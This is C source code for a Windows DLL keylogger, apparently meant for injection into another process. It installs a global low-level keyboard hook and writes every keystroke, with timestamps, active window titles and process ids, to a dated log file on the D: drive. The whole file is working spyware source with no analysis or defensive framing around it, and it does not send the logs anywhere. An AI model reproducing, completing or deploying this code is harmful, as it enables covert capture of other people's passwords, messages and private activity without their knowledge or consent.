
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

#define MAX_BUFSIZE 30
#define MAX_MODULE_NAME 260

HANDLE	file;
HHOOK	hook;
DWORD	prevWinID = NULL;
CHAR	prevModuleName[MAX_MODULE_NAME],
		g_buf[MAX_BUFSIZE],
		glPath[] = "D:\\";


BOOL getCharKey(const DWORD vkCode, const DWORD scanCode, LPWORD ch, const DWORD winID)
{
	BYTE keyState[256];
	GetKeyboardState(keyState);

	//buggggggg
	//AttachThreadInput(GetCurrentThreadId(), winID, TRUE);
	//HWND wfc = GetFocus();
	//DWORD tidfc = NULL;
	//GetWindowThreadProcessId(wfc, &tidfc);
	//(g_buf + strlen(g_buf) + 1, ":%d:", tidfc);
	//buggggggggg
	return ToAsciiEx(vkCode, scanCode, keyState, ch, 0, GetKeyboardLayout(winID)) == 1;
	//return ToUnicodeEx(vkCode, scanCode, keyState, (LPWSTR)&ch, 5, 0, GetKeyboardLayout(winID)) == 1;
}

BOOL getSysKey(const DWORD vkCode)
{
	char * buf = g_buf + strlen(g_buf);
	switch (vkCode)
	{
	case VK_F1:			strcpy(buf, "[F1]\r\n"); break;
	case VK_F2:			strcpy(buf, "[F2]\r\n"); break;
	case VK_F3:			strcpy(buf, "[F3]\r\n"); break;
	case VK_F4:			strcpy(buf, "[F4]\r\n"); break;
	case VK_F5:			strcpy(buf, "[F5]\r\n"); break;
	case VK_F6:			strcpy(buf, "[F6]\r\n"); break;
	case VK_F7:			strcpy(buf, "[F7]\r\n"); break;
	case VK_F8:			strcpy(buf, "[F8]\r\n"); break;
	case VK_F9:			strcpy(buf, "[F9]\r\n"); break;
	case VK_F10:		strcpy(buf, "[F10]\r\n"); break;
	case VK_F11:		strcpy(buf, "[F11]\r\n"); break;
	case VK_F12:		strcpy(buf, "[F12]\r\n"); break;
	case VK_BACK:		strcpy(buf, "[BACK]\r\n"); break;
	case VK_TAB:		strcpy(buf, "[TAB]\r\n"); break;
	case VK_RETURN:		strcpy(buf, "[RET]\r\n"); break;
	case VK_RCONTROL:	strcpy(buf, "[RCTRL]\r\n"); break;
	case VK_LCONTROL:	strcpy(buf, "[CTRL]\r\n"); break;
	case VK_ESCAPE:		strcpy(buf, "[ESC]\r\n"); break;
	case VK_SPACE:		strcpy(buf, "[SPACE]\r\n"); break;
	case VK_RSHIFT:		strcpy(buf, "[RSHIFT]\r\n"); break;
	case VK_LSHIFT:		strcpy(buf, "[SHIFT]\r\n"); break;
	case VK_CAPITAL:	strcpy(buf, "[CAPSLOCK]\r\n"); break;
	case VK_DELETE:		strcpy(buf, "[DELETE]\r\n"); break;
	case VK_INSERT:		strcpy(buf, "[INSERT]\r\n"); break;
	case VK_LWIN:		strcpy(buf, "[WIN]\r\n"); break;
	case VK_RWIN:		strcpy(buf, "[RWIN]\r\n"); break;
	case VK_UP:			strcpy(buf, "[UP]\r\n"); break;
	case VK_DOWN:		strcpy(buf, "[DOWN]\r\n"); break;
	case VK_LEFT:		strcpy(buf, "[LEFT]\r\n"); break;
	case VK_RIGHT:		strcpy(buf, "[RIGHT]\r\n"); break;
	case VK_HOME:		strcpy(buf, "[HOME]\r\n"); break;
	case VK_END:		strcpy(buf, "[END]\r\n"); break;
	case VK_PRIOR:		strcpy(buf, "[PGDN]\r\n"); break;
	case VK_NEXT:		strcpy(buf, "[PGUP]\r\n"); break;
	case VK_LMENU:		strcpy(buf, "[ALT]\r\n"); break;
	case VK_RMENU:		strcpy(buf, "[RALT]\r\n"); break;
	default:			return FALSE;
	}
	return TRUE;
}

LRESULT CALLBACK LowLevelKeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	GetKeyState(NULL);
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		DWORD written;
		KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT*) lParam;
		SYSTEMTIME st;
		CHAR moduleName[MAX_MODULE_NAME];
		DWORD winID = NULL;
		HWND activeWindow = GetForegroundWindow();
		GetWindowThreadProcessId(activeWindow, &winID);
		GetWindowText(activeWindow, moduleName, MAX_MODULE_NAME);
		if (winID != prevWinID || strcmp(moduleName, prevModuleName))
		{
			prevWinID = winID;
			strcpy(prevModuleName, moduleName);
			sprintf(moduleName + strlen(moduleName), " : %d", winID);
			strcat(moduleName, "\r\n");
			WriteFile(file, moduleName, strlen(moduleName), &written, NULL);
		}

		GetLocalTime(&st);
		GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, g_buf, MAX_BUFSIZE);
		strcat(g_buf, "		");
		char * buf = g_buf + strlen(g_buf);
		if (getSysKey(ks->vkCode))
		{
			WriteFile(file, g_buf, strlen(g_buf), &written, NULL);
		}
		else if (getCharKey(ks->vkCode, ks->scanCode, (LPWORD) buf, winID))
		{
			strcpy(buf + 1, "\r\n");
			WriteFile(file, g_buf, strlen(g_buf), &written, NULL);
		}
		else
		{
			strcat(g_buf, "[unknown]\r\n");
			WriteFile(file, g_buf, strlen(g_buf), &written, NULL);
		}
	}

	if (GetKeyState(VK_LSHIFT) & GetKeyState(VK_RSHIFT) & 0x0100)
		PostQuitMessage(0);

	return CallNextHookEx(hook, nCode, wParam, lParam);
}

bool CreateLogFile()
{
	CHAR fileName[MAX_PATH];
	SYSTEMTIME st;
	DWORD fileNum = 1;
	GetLocalTime(&st);
	GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, "dd.MM.yy", fileName, MAX_PATH);
	char * ptrAfterSyl_ = fileName + strlen(fileName) + 1;
	strcat(fileName, "_1.txt");
	char path[MAX_PATH];
	strcpy(path, glPath);
	strcat(path, fileName);
	file = CreateFile(path, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	while (GetLastError() == ERROR_FILE_EXISTS)
	{
		fileNum++;
		wsprintf(ptrAfterSyl_, "%d", fileNum);
		strcat(fileName, ".txt");
		strcpy(path, glPath);
		strcat(path, fileName);
		file = CreateFile(path, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	}
	return file != INVALID_HANDLE_VALUE;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	//MessageBox(NULL, "Injection", "Good", MB_OK);
	HANDLE mutex = CreateMutex(NULL, FALSE, "KeyboardLogger");
	if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_ACCESS_DENIED)
	{
		//MessageBox(NULL, "Error", "Next copy KeyboardLogger", MB_OK);
		return 1;
	}
	if (!CreateLogFile())
	{
		//MessageBox(NULL, "Error", "Can't create logFile", MB_OK);
		ReleaseMutex(mutex);
		return 1;
	}
	HINSTANCE instance = GetModuleHandle(NULL);
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardHook, instance, 0);

	MSG msg;
	while (GetMessage(&msg, 0, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	ReleaseMutex(mutex);
	UnhookWindowsHookEx(hook);
	CloseHandle(file);
	/*switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
	break;
	}*/
	return TRUE;
}

